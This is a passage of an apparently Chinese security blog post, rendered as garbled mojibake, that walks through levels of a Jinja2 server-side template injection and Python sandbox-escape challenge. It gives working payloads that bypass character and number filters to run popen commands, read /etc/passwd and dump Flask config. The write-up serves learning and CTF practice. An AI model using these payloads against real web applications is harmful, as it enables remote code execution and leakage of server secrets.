2. åœ¨jinjia2è¯­æ³•ä¸­`~`å¯ä»¥è¿›è¡Œè¿æ¥ï¼Œæ¯”å¦‚ï¼š`&#123;%set a="__cla"%&#125;&#123;%set aa="ss__%&#125;&#123;&#123;a~aa&#125;&#125;</code><br>3. ä½¿ç”¨joinè¿‡æ»¤å™¨.ä¾‹å¦‚ä½¿ç”¨<code>&#123;%set a=dict(__cla=a,ss__=a)|join%&#125;&#123;&#123;a&#125;&#125;</code>,ä¼šå°†<code>__cla</code>å’Œ<code>ss__</code>æ‹¼æ¥åœ¨ä¸€èµ·,æˆ–è€…<code>&#123;%set a=['__cla','ss__']|join%&#125;&#123;&#123;a&#125;&#125;</code><br>4. ä½¿ç”¨<code>reverse</code>è¿‡æ»¤å™¨.å¦‚<code>&#123;%set a="__ssalc__"|reverse%&#125;&#123;&#123;a&#125;&#125;</code><br>5. ä½¿ç”¨<code>replace</code>è¿‡æ»¤å™¨.å¦‚<code>&#123;%set a="__claee__"|replace("ee","ss")%&#125;&#123;&#123;a&#125;&#125;</code><br>6. ä½¿ç”¨pythonä¸­çš„<code>char()</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> <span class="token assign-left variable">chr</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__.__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span>.__init__.__globals__.__builtins__.chr %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__.__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>.pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">119</span><span class="token punctuation">)</span>%2bchr<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">))</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h3><p>è¿‡æ»¤æ•°å­—ï¼Œä¹Ÿå°±æ˜¯è¯´<code>__subclasses__()[139]</code>ä¸­çš„139è¦æƒ³åŠæ³•ç»•è¿‡ï¼Œä½¿ç”¨å…¶ä»–ä»£æ›¿ã€‚<br>å¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨<code>|length</code>æ¥ç»•è¿‡ã€‚ä½¿ç”¨è¯¥è¿‡æ»¤å™¨æ„é€ 139<br><code>&#123;%set a='aaaaaaaaaaaa'|length*'aaaaaaaaaaa'|length+'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;</code><br><code>139=12*11+7</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110145820.png" loading="lazy"><br>æ‰€ä»¥æœ€åçš„payloadåªéœ€è¦å°†ç¬¬ä¸€å…³çš„payloadä¸­çš„æ•°å­—ç»™æ›¿æ¢æˆaå³å¯ã€‚</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> <span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token string">'aaaaaaaaaaaa'</span><span class="token operator">|</span>length*<span class="token string">'aaaaaaaaaaa'</span><span class="token operator">|</span>length+<span class="token string">'aaaaaaa'</span><span class="token operator">|</span>length %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110150512.png" loading="lazy"></p>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><blockquote>
<p>set config = None</p>
</blockquote>
<p>ä¸€èˆ¬åœ¨sstiä¸­æ˜¾ç¤ºconfigçš„è¯­æ³•å°±æ˜¯ç›´æ¥<code>&#123;&#123;config&#125;&#125;/&#123;&#123;self&#125;&#125;</code><br>è¿™é‡Œè¢«banæ‰äº†ã€‚æ‰€ä»¥è¦æ‰¾å…¶ä»–æ–¹å¼bypassï¼Œ<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/appcontext.html">http://docs.jinkan.org/docs/flask/appcontext.html</a><br>è¿˜æœ‰ä¸€ä¸ªå˜é‡ï¼Œå¯ä»¥ç”¨ã€‚<code>current_app</code></p>
<blockquote>
<p>åº”ç”¨ä¸Šä¸‹æ–‡ä¼šåœ¨å¿…è¦æ—¶è¢«åˆ›å»ºå’Œé”€æ¯ã€‚å®ƒä¸ä¼šåœ¨çº¿ç¨‹é—´ç§»åŠ¨ï¼Œå¹¶ä¸”ä¹Ÿä¸ä¼šåœ¨ä¸åŒçš„è¯·æ±‚ä¹‹é—´å…±äº«ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®åº“è¿æ¥ä¿¡æ¯æˆ–æ˜¯åˆ«çš„ä¸œè¥¿çš„æœ€ä½³ä½ç½®ã€‚</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for.__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span>.config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>get_flashed_messages.__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span>.config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110153731.png" loading="lazy"></p>
<h3 id="Level-11"><a href="#Level-11" class="headerlink" title="Level-11"></a>Level-11</h3><blockquote>
<p>bl[â€˜&#39;â€˜, â€˜â€œâ€˜, â€˜+â€™, â€˜requestâ€™, â€˜.â€™, â€˜[â€˜, â€˜]â€™]</p>
</blockquote>
<p>éœ€è¦ç»•è¿‡çš„ç‚¹æ˜¯ï¼š<code>&#39; &quot; + </code>ï¼Œä»å‰é¢å‡ å…³å¯ä»¥çŸ¥é“ï¼Œè¿‡æ»¤äº†å•åŒå¼•å·çš„è¯ï¼Œå¯ä»¥ç”¨<code>request.args</code>æ¥ç»•è¿‡ï¼Œç„¶å<code>request</code>ä¹Ÿè¢«è¿‡æ»¤æ‰äº†ï¼›è¿˜æœ‰<code>.</code>è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨<code>[]</code>æ¥ç»•è¿‡ï¼Œä½†æ˜¯<code>[]</code>ä¹Ÿè¢«è¿‡æ»¤ã€‚<code>[]</code>å¯ä»¥ä½¿ç”¨<code>__getitem__</code>ç»•è¿‡ï¼Œ<code>.</code>è¿˜èƒ½ä½¿ç”¨è¿‡æ»¤å™¨<code>attr</code>ç»•è¿‡ã€‚æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆç»•è¿‡å•åŒå¼•å·ã€‚</p>
<p>åœ¨æ²¡æœ‰ä½¿ç”¨åˆ°å¼•å·çš„å‰æä¸‹æˆåŠŸæ‰§è¡Œï¼Œå°±æ˜¯è¿‡æ»¤å™¨ï¼š<code>dict()|join</code>ï¼Œ<br><code>&#123;% set a=dict(__cla=a,ss__=b)|join%&#125;&#123;&#123;()|attr(a)&#125;&#125;</code></p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161207.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token operator">|</span>select<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">))</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span>string<span class="token punctuation">(</span><span class="token punctuation">))</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> org <span class="token operator">=</span> <span class="token punctuation">(</span>app.__doc__<span class="token operator">|</span>string<span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>org<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p>ä¸Šè¿°æ„é€ æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥å‘ç°è¿™å‡ æ¡payloadå›æ˜¾çš„å†…å®¹æ˜¯ç”±å¯æ‰“å°å­—ç¬¦çš„ã€‚</p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161515.png" loading="lazy"></p>
<p>è¿˜æœ‰ç™¾åˆ†å·<code>%</code>ï¼Œå‡å¦‚ç™¾åˆ†å·ä¹Ÿè¢«è¿‡æ»¤æ‰ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠæ³•æ¥æ„é€ å‡º<code>%</code><br><code>&#123;% set org = self|string|urlencode|list %&#125;&#123;&#123;org[0]&#125;&#125;</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110161829.png" loading="lazy"><br>æ‰€ä»¥å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">a</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__cla<span class="token operator">=</span>a,ss__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __class__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">b</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__bas<span class="token operator">=</span>a,e__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __base__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">c</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__subcla<span class="token operator">=</span>a,sses__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __subclasses__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">d</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__ge<span class="token operator">=</span>a,titem__<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># __getitem__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">e</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__in<span class="token operator">=</span>a,it__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __init__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">f</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>__glo<span class="token operator">=</span>a,bals__<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># __globals__</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">g</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>pop<span class="token operator">=</span>a,en<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span> %<span class="token punctuation">&#125;</span><span class="token comment"># popen</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">h</span><span class="token operator">=</span>self<span class="token operator">|</span>string<span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>%<span class="token punctuation">&#125;</span><span class="token comment"># ç©ºæ ¼</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token punctuation">(</span>dict<span class="token punctuation">(</span>type<span class="token operator">=</span>abc<span class="token punctuation">)</span><span class="token operator">|</span>join,h,dict<span class="token punctuation">(</span>flag<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">join</span><span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># type flag</span>
<span class="token punctuation">&#123;</span>%set <span class="token assign-left variable">j</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>read<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span><span class="token comment"># read</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># æ‹¼æ¥</span></code></pre>
<p>ç»“æœ<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220110164037.png" loading="lazy"></p>
<h2 id="ç»“"><a href="#ç»“" class="headerlink" title="ç»“"></a>ç»“</h2><p>å‰©ä¸‹çš„æš‚æ—¶ä¸æƒ³å†™äº†ï¼Œå…ˆmarkäº†ã€‚å›å¤´å†çœ‹ã€‚</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>m0re</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://m0re.top/posts/39874e07/" title="Pythonçš„SSTIæ¨¡ç‰ˆæ³¨å…¥åŠæ²™ç›’é€ƒé€¸">https://m0re.top/posts/39874e07/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/f8f6e3f5/" rel="next" title="ã€Javaå­¦ä¹ ç¬”è®°ã€‘0x01"><span class="post-nav-text">ã€Javaå­¦ä¹ ç¬”è®°ã€‘0x01</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å°è¯•ä½¿ç”¨ utterances ï¼ˆåŸºäº GitHub Issuesï¼‰è¯„è®ºç³»ç»Ÿã€‚</span><br><span>æ‚¨å¯ä»¥ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®åˆ‡æ¢å¯¹åº”è¯„è®ºç³»ç»Ÿï¼Œ</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"è¯„è®ºä¸€ä¸‹~&nbsp_(:Ğ·ã€âˆ )_ ï¼ˆå¡«å†™é‚®ç®±å¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥ï½ï¼‰","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/39874e07/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è±«ICPå¤‡2020025591å·-1</a></div><div class="copyright"><span>&copy; 2020 â€“ 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.1.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>æœ¬åšå®¢å·²è‹Ÿå»¶æ®‹å–˜äº†</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="æ€»è®¿å®¢é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="æ€»è®¿é—®é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æœç´¢..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>